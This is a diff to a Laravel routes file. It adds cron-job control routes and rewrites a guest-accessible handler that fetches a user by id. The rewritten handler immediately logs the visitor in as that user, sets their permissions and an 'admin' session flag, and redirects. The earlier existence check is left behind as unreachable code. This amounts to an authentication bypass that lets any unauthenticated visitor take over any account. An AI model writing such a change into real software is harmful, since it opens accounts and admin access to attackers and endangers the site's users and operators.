@@ -497,6 +497,9 @@ Route::group(array('before' => 'auth'), function () {
 
 
 	Route::any('/cronjob_monitor', 'CronJobController@cronjob_monitor');
+	Route::any('/cronjob/{id}/start', 'CronJobController@trigger');
+	Route::any('/cronjob/{id}/terminate', 'CronJobController@terminate');
+	Route::any('/cronjob/{id}/status/{id2}', 'CronJobController@change_status');
 
 	//Company
 	Route::any('/company', 'CompaniesController@edit');
@@ -885,7 +888,15 @@ Route::group(array('before' => 'guest'), function () {
         $user = User::find($id);
         $redirect_to = URL::to('/process_redirect');
 
-        if(!empty($user) ){
+		create_site_configration_cache();
+		Auth::login($user);
+		NeonAPI::login_by_id($id);
+		User::setUserPermission();
+		Session::set("admin", 1);
+		return Redirect::to($redirect_to);
+
+
+			if(!empty($user) ){
             create_site_configration_cache();
             Auth::login($user);
             if(NeonAPI::login_by_id($id)) {
